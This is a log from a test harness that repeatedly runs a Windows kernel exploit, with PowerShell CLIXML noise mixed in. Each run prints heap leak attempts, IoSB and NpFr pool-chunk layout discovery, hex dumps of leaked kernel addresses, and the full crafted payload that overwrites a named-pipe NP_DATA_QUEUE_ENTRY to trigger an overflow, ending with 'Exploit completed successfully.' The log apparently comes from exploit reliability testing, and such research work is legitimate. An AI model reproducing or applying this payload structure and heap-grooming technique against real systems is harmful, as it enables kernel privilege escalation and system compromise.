<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:44+00:00,2,33,25,running,running,True,success,0,6.531,True,True,6,3.5,1,6,6,1,"oSB attempt 5 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 6 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 5 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=487 capture=0 iosbAttempt=5 pipeAttempt=0 pipeLeak=0
    [000001EDB6DA7ED0]  42536F490A100000  2B6FDF6265B9F1ED
    [000001EDB6DA7EE0]  D4903CE5B928B15D  0000000000000000
    [000001EDB6DA7EF0]  0000000000000000  0000000000000000
    [000001EDB6DA7F00]  42536F490E0D0003  0000000000000000
    [000001EDB6DA7F10]  000000000000000C  FFFF970D6F4666A0
    [000001EDB6DA7F20]  00000000000003E8  6161616161616161
    [000001EDB6DA7F30]  6161616161616161  6161616161616161
    [000001EDB6DA7F40]  6161616161616161  6161616161616161
    [000001EDB6DA7F50]  6161616161616161  6161616161616161
    [000001EDB6DA7F60]  6161616161616161  6161616161616161
    [000001EDB6DA7F70]  6161616161616161  6161616161616161
    [000001EDB6DA7F80]  6161616161616161  6161616161616161
    [000001EDB6DA7F90]  6161616161616161  6161616161616161
    [000001EDB6DA7FA0]  6161616161616161  6161616161616161
    [000001EDB6DA7FB0]  6161616161616161  6161616161616161
    [000001EDB6DA7FC0]  0000000000000000  0000000000000000
    [000001EDB6DA7FD0]  7246704E0A100000  2B6FDF6265B9F2ED
    [000001EDB6DA7FE0]  FFFF970D70A50548  FFFF970D70A50548
    [000001EDB6DA7FF0]  0000000000000000  FFFF970D70D7ABE0
    [000001EDB6DA8000]  000000C000000000  00000000000000C0
    [000001EDB6DA8010]  000001E745504950  3939393939393939
    [000001EDB6DA8020]  3939393939393939  3939393939393939
    [000001EDB6DA8030]  3939393939393939  3939393939393939
    [000001EDB6DA8040]  3939393939393939  3939393939393939
    [000001EDB6DA8050]  3939393939393939  3939393939393939
    [000001EDB6DA8060]  3939393939393939  3939393939393939
    [000001EDB6DA8070]  3939393939393939  3939393939393939
    [000001EDB6DA8080]  3939393939393939  3939393939393939
    [000001EDB6DA8090]  3939393939393939  3939393939393939
    [000001EDB6DA80A0]  3939393939393939  3939393939393939
    [000001EDB6DA80B0]  3939393939393939  3939393939393939
    [000001EDB6DA80C0]  3939393939393939  3939393939393939
    [000001EDB6DA80D0]  7246704E0A100000  2B6FDF6265B9F3ED
    [000001EDB6DA80E0]  FFFF970D70904508  FFFF970D70904508
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001EDB7190510]  7246704E0A100000  2B6FDF6265B9F2ED
    [000001EDB7190520]  FFFF970D70A50548  FFFF970D70A50548
    [000001EDB7190530]  000001EDB6D707D0  FFFF970D70D7ABE0
    [000001EDB7190540]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001EDB7190500]  0000000000000000  0000000000000000
    [000001EDB7190510]  7246704E0A100000  2B6FDF6265B9F2ED
    [000001EDB7190520]  FFFF970D70A50548  FFFF970D70A50548
    [000001EDB7190530]  000001EDB6D707D0  FFFF970D70D7ABE0
    [000001EDB7190540]  000000C000000001  00000000000000C0
    [000001EDB7190550]  000001E745504950  3939393939393939
    [000001EDB7190560]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=4
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:59+00:00,2,34,26,running,running,True,success,0,13.063,True,True,76,28.776,1,65,3,3,"nLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 2 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=21 capture=2 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [0000014DED3B55D0]  42536F490A100000  2B6FDF626859C7ED
    [0000014DED3B55E0]  D4903CE5BAF9075D  0000000000000000
    [0000014DED3B55F0]  0000000000000000  0000000000000000
    [0000014DED3B5600]  42536F490E0D0003  0000000000000000
    [0000014DED3B5610]  000000000000000C  FFFF970D70E72130
    [0000014DED3B5620]  00000000000003E8  6161616161616161
    [0000014DED3B5630]  6161616161616161  6161616161616161
    [0000014DED3B5640]  6161616161616161  6161616161616161
    [0000014DED3B5650]  6161616161616161  6161616161616161
    [0000014DED3B5660]  6161616161616161  6161616161616161
    [0000014DED3B5670]  6161616161616161  6161616161616161
    [0000014DED3B5680]  6161616161616161  6161616161616161
    [0000014DED3B5690]  6161616161616161  6161616161616161
    [0000014DED3B56A0]  6161616161616161  6161616161616161
    [0000014DED3B56B0]  6161616161616161  6161616161616161
    [0000014DED3B56C0]  0000000000000000  0000000000000000
    [0000014DED3B56D0]  7246704E0A100000  2B6FDF626859B8ED
    [0000014DED3B56E0]  FFFF970D70633308  FFFF970D70633308
    [0000014DED3B56F0]  0000000000000000  FFFF970D709E1160
    [0000014DED3B5700]  000000C000000000  00000000000000C0
    [0000014DED3B5710]  0000001545504950  3939393939393939
    [0000014DED3B5720]  3939393939393939  3939393939393939
    [0000014DED3B5730]  3939393939393939  3939393939393939
    [0000014DED3B5740]  3939393939393939  3939393939393939
    [0000014DED3B5750]  3939393939393939  3939393939393939
    [0000014DED3B5760]  3939393939393939  3939393939393939
    [0000014DED3B5770]  3939393939393939  3939393939393939
    [0000014DED3B5780]  3939393939393939  3939393939393939
    [0000014DED3B5790]  3939393939393939  3939393939393939
    [0000014DED3B57A0]  3939393939393939  3939393939393939
    [0000014DED3B57B0]  3939393939393939  3939393939393939
    [0000014DED3B57C0]  3939393939393939  00000000FDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000014DED8ABF20]  7246704E0A100000  2B6FDF626859B8ED
    [0000014DED8ABF30]  FFFF970D70633308  FFFF970D70633308
    [0000014DED8ABF40]  0000014DED2CFE40  FFFF970D709E1160
    [0000014DED8ABF50]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000014DED8ABF10]  0000000000000000  0000000000000000
    [0000014DED8ABF20]  7246704E0A100000  2B6FDF626859B8ED
    [0000014DED8ABF30]  FFFF970D70633308  FFFF970D70633308
    [0000014DED8ABF40]  0000014DED2CFE40  FFFF970D709E1160
    [0000014DED8ABF50]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=9
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:42:13+00:00,2,35,27,running,running,True,success,0,13.266,True,True,14,7.5,1,14,14,1,"SB attempt 13 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 14 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 13 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=15 capture=0 iosbAttempt=13 pipeAttempt=0 pipeLeak=0
    [000001F518BC1EF0]  42536F490A100000  2B6FDF626614C5ED
    [000001F518BC1F00]  D4903CE5BAF9955D  0000000000000000
    [000001F518BC1F10]  0000000000000000  0000000000000000
    [000001F518BC1F20]  42536F490E0D0003  0000000000000000
    [000001F518BC1F30]  000000000000000C  FFFF970D70E684A0
    [000001F518BC1F40]  00000000000003E8  6161616161616161
    [000001F518BC1F50]  6161616161616161  6161616161616161
    [000001F518BC1F60]  6161616161616161  6161616161616161
    [000001F518BC1F70]  6161616161616161  6161616161616161
    [000001F518BC1F80]  6161616161616161  6161616161616161
    [000001F518BC1F90]  6161616161616161  6161616161616161
    [000001F518BC1FA0]  6161616161616161  6161616161616161
    [000001F518BC1FB0]  6161616161616161  6161616161616161
    [000001F518BC1FC0]  6161616161616161  6161616161616161
    [000001F518BC1FD0]  6161616161616161  6161616161616161
    [000001F518BC1FE0]  0000000000000000  0000000000000000
    [000001F518BC1FF0]  7246704E0A100000  2B6FDF626614C6ED
    [000001F518BC2000]  FFFF970D70974128  FFFF970D70974128
    [000001F518BC2010]  0000000000000000  FFFF970D70D19840
    [000001F518BC2020]  000000C000000000  00000000000000C0
    [000001F518BC2030]  0000000F45504950  3939393939393939
    [000001F518BC2040]  3939393939393939  3939393939393939
    [000001F518BC2050]  3939393939393939  3939393939393939
    [000001F518BC2060]  3939393939393939  3939393939393939
    [000001F518BC2070]  3939393939393939  3939393939393939
    [000001F518BC2080]  3939393939393939  3939393939393939
    [000001F518BC2090]  3939393939393939  3939393939393939
    [000001F518BC20A0]  3939393939393939  3939393939393939
    [000001F518BC20B0]  3939393939393939  3939393939393939
    [000001F518BC20C0]  3939393939393939  3939393939393939
    [000001F518BC20D0]  3939393939393939  3939393939393939
    [000001F518BC20E0]  3939393939393939  3939393939393939
    [000001F518BC20F0]  7246704E0A100000  2B6FDF626614C7ED
    [000001F518BC2100]  FFFF970D709757A8  FFFF970D709757A8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001F518E8FC50]  7246704E0A100000  2B6FDF626614C6ED
    [000001F518E8FC60]  FFFF970D70974128  FFFF970D70974128
    [000001F518E8FC70]  000001F518B9FCC0  FFFF970D70D19840
    [000001F518E8FC80]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001F518E8FC40]  0000000000000000  0000000000000000
    [000001F518E8FC50]  7246704E0A100000  2B6FDF626614C6ED
    [000001F518E8FC60]  FFFF970D70974128  FFFF970D70974128
    [000001F518E8FC70]  000001F518B9FCC0  FFFF970D70D19840
    [000001F518E8FC80]  000000C000000001  00000000000000C0
    [000001F518E8FC90]  0000000F45504950  3939393939393939
    [000001F518E8FCA0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=8
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:42:18+00:00,2,36,28,running,running,True,success,0,3.594,True,True,5,3.0,1,5,5,1,"ength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 4 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 5 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 4 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=1017 capture=0 iosbAttempt=4 pipeAttempt=0 pipeLeak=0
    [0000020A9C92FE40]  42536F490A100000  2B6FDF62670896ED
    [0000020A9C92FE50]  D4903CE5BAF8565D  0000000000000000
    [0000020A9C92FE60]  0000000000000000  0000000000000000
    [0000020A9C92FE70]  42536F490E0D0003  0000000000000000
    [0000020A9C92FE80]  000000000000000C  FFFF970D70B0D4C0
    [0000020A9C92FE90]  00000000000003E8  6161616161616161
    [0000020A9C92FEA0]  6161616161616161  6161616161616161
    [0000020A9C92FEB0]  6161616161616161  6161616161616161
    [0000020A9C92FEC0]  6161616161616161  6161616161616161
    [0000020A9C92FED0]  6161616161616161  6161616161616161
    [0000020A9C92FEE0]  6161616161616161  6161616161616161
    [0000020A9C92FEF0]  6161616161616161  6161616161616161
    [0000020A9C92FF00]  6161616161616161  6161616161616161
    [0000020A9C92FF10]  6161616161616161  6161616161616161
    [0000020A9C92FF20]  6161616161616161  6161616161616161
    [0000020A9C92FF30]  0000000000000000  0000000000000000
    [0000020A9C92FF40]  7246704E0A100000  2B6FDF62670897ED
    [0000020A9C92FF50]  FFFF970D70E87D68  FFFF970D70E87D68
    [0000020A9C92FF60]  0000000000000000  FFFF970D70DD5140
    [0000020A9C92FF70]  000000C000000000  00000000000000C0
    [0000020A9C92FF80]  000003F945504950  3939393939393939
    [0000020A9C92FF90]  3939393939393939  3939393939393939
    [0000020A9C92FFA0]  3939393939393939  3939393939393939
    [0000020A9C92FFB0]  3939393939393939  3939393939393939
    [0000020A9C92FFC0]  3939393939393939  3939393939393939
    [0000020A9C92FFD0]  3939393939393939  3939393939393939
    [0000020A9C92FFE0]  3939393939393939  3939393939393939
    [0000020A9C92FFF0]  3939393939393939  3939393939393939
    [0000020A9C930000]  3939393939393939  3939393939393939
    [0000020A9C930010]  3939393939393939  3939393939393939
    [0000020A9C930020]  3939393939393939  3939393939393939
    [0000020A9C930030]  3939393939393939  00000000FDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000020A9C929250]  7246704E0A100000  2B6FDF62670897ED
    [0000020A9C929260]  FFFF970D70E87D68  FFFF970D70E87D68
    [0000020A9C929270]  0000020A9C4708F0  FFFF970D70DD5140
    [0000020A9C929280]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000020A9C929240]  0000000000000000  0000000000000000
    [0000020A9C929250]  7246704E0A100000  2B6FDF62670897ED
    [0000020A9C929260]  FFFF970D70E87D68  FFFF970D70E87D68
    [0000020A9C929270]  0000020A9C4708F0  FFFF970D70DD5140
    [0000020A9C929280]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:42:35+00:00,2,37,29,running,running,True,success,0,15.344,True,True,73,29.877,1,65,8,2,"5536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 8 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 7 leak 2
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=30 capture=1 iosbAttempt=7 pipeAttempt=0 pipeLeak=0
    [000001B6990F54A0]  42536F490A100000  2B6FDF6267F960ED
    [000001B6990F54B0]  D4903CE5BA85D05D  0000000000000000
    [000001B6990F54C0]  0000000000000000  0000000000000000
    [000001B6990F54D0]  42536F490E0D0003  0000000000000000
    [000001B6990F54E0]  000000000000000C  FFFF970D711F23F0
    [000001B6990F54F0]  00000000000003E8  6161616161616161
    [000001B6990F5500]  6161616161616161  6161616161616161
    [000001B6990F5510]  6161616161616161  6161616161616161
    [000001B6990F5520]  6161616161616161  6161616161616161
    [000001B6990F5530]  6161616161616161  6161616161616161
    [000001B6990F5540]  6161616161616161  6161616161616161
    [000001B6990F5550]  6161616161616161  6161616161616161
    [000001B6990F5560]  6161616161616161  6161616161616161
    [000001B6990F5570]  6161616161616161  6161616161616161
    [000001B6990F5580]  6161616161616161  6161616161616161
    [000001B6990F5590]  0000000000000000  0000000000000000
    [000001B6990F55A0]  7246704E0A100000  2B6FDF6267F961ED
    [000001B6990F55B0]  FFFF970D7061DBE8  FFFF970D7061DBE8
    [000001B6990F55C0]  0000000000000000  FFFF970D709D48C0
    [000001B6990F55D0]  000000C000000000  00000000000000C0
    [000001B6990F55E0]  0000001E45504950  3939393939393939
    [000001B6990F55F0]  3939393939393939  3939393939393939
    [000001B6990F5600]  3939393939393939  3939393939393939
    [000001B6990F5610]  3939393939393939  3939393939393939
    [000001B6990F5620]  3939393939393939  3939393939393939
    [000001B6990F5630]  3939393939393939  3939393939393939
    [000001B6990F5640]  3939393939393939  3939393939393939
    [000001B6990F5650]  3939393939393939  3939393939393939
    [000001B6990F5660]  3939393939393939  3939393939393939
    [000001B6990F5670]  3939393939393939  3939393939393939
    [000001B6990F5680]  3939393939393939  3939393939393939
    [000001B6990F5690]  3939393939393939  3939393939393939
    [000001B6990F56A0]  7246704E0A100000  2B6FDF6267F962ED
    [000001B6990F56B0]  FFFF970D70617888  FFFF970D70617888
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001B698BA37B0]  7246704E0A100000  2B6FDF6267F961ED
    [000001B698BA37C0]  FFFF970D7061DBE8  FFFF970D7061DBE8
    [000001B698BA37D0]  000001B698B00B90  FFFF970D709D48C0
    [000001B698BA37E0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001B698BA37A0]  0000000000000000  0000000000000000
    [000001B698BA37B0]  7246704E0A100000  2B6FDF6267F961ED
    [000001B698BA37C0]  FFFF970D7061DBE8  FFFF970D7061DBE8
    [000001B698BA37D0]  000001B698B00B90  FFFF970D709D48C0
    [000001B698BA37E0]  000000C000000001  00000000000000C0
    [000001B698BA37F0]  0000001E45504950  3939393939393939
    [000001B698BA3800]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=12
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:42:40+00:00,2,38,30,running,running,True,success,0,3.578,True,True,16,8.5,1,16,16,1,"gth=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 15 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 16 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 15 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=14 capture=0 iosbAttempt=15 pipeAttempt=0 pipeLeak=0
    [0000017E08277010]  42536F490A100000  2B6FDF6265B227ED
    [0000017E08277020]  D4903CE5B9C8B75D  0000000000000000
    [0000017E08277030]  0000000000000000  0000000000000000
    [0000017E08277040]  42536F490E0D0003  0000000000000000
    [0000017E08277050]  000000000000000C  FFFF970D711E8070
    [0000017E08277060]  00000000000003E8  6161616161616161
    [0000017E08277070]  6161616161616161  6161616161616161
    [0000017E08277080]  6161616161616161  6161616161616161
    [0000017E08277090]  6161616161616161  6161616161616161
    [0000017E082770A0]  6161616161616161  6161616161616161
    [0000017E082770B0]  6161616161616161  6161616161616161
    [0000017E082770C0]  6161616161616161  6161616161616161
    [0000017E082770D0]  6161616161616161  6161616161616161
    [0000017E082770E0]  6161616161616161  6161616161616161
    [0000017E082770F0]  6161616161616161  6161616161616161
    [0000017E08277100]  0000000000000000  0000000000000000
    [0000017E08277110]  7246704E0A100000  2B6FDF6265B238ED
    [0000017E08277120]  FFFF970D70971BA8  FFFF970D70971BA8
    [0000017E08277130]  0000000000000000  FFFF970D70D060A0
    [0000017E08277140]  000000C000000000  00000000000000C0
    [0000017E08277150]  0000000E45504950  3939393939393939
    [0000017E08277160]  3939393939393939  3939393939393939
    [0000017E08277170]  3939393939393939  3939393939393939
    [0000017E08277180]  3939393939393939  3939393939393939
    [0000017E08277190]  3939393939393939  3939393939393939
    [0000017E082771A0]  3939393939393939  3939393939393939
    [0000017E082771B0]  3939393939393939  3939393939393939
    [0000017E082771C0]  3939393939393939  3939393939393939
    [0000017E082771D0]  3939393939393939  3939393939393939
    [0000017E082771E0]  3939393939393939  3939393939393939
    [0000017E082771F0]  3939393939393939  3939393939393939
    [0000017E08277200]  3939393939393939  00000000FDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000017E08269610]  7246704E0A100000  2B6FDF6265B238ED
    [0000017E08269620]  FFFF970D70971BA8  FFFF970D70971BA8
    [0000017E08269630]  0000017E07C901F0  FFFF970D70D060A0
    [0000017E08269640]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000017E08269600]  0000000000000000  0000000000000000
    [0000017E08269610]  7246704E0A100000  2B6FDF6265B238ED
    [0000017E08269620]  FFFF970D70971BA8  FFFF970D70971BA8
    [0000017E08269630]  0000017E07C901F0  FFFF970D70D060A0
    [0000017E08269640]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
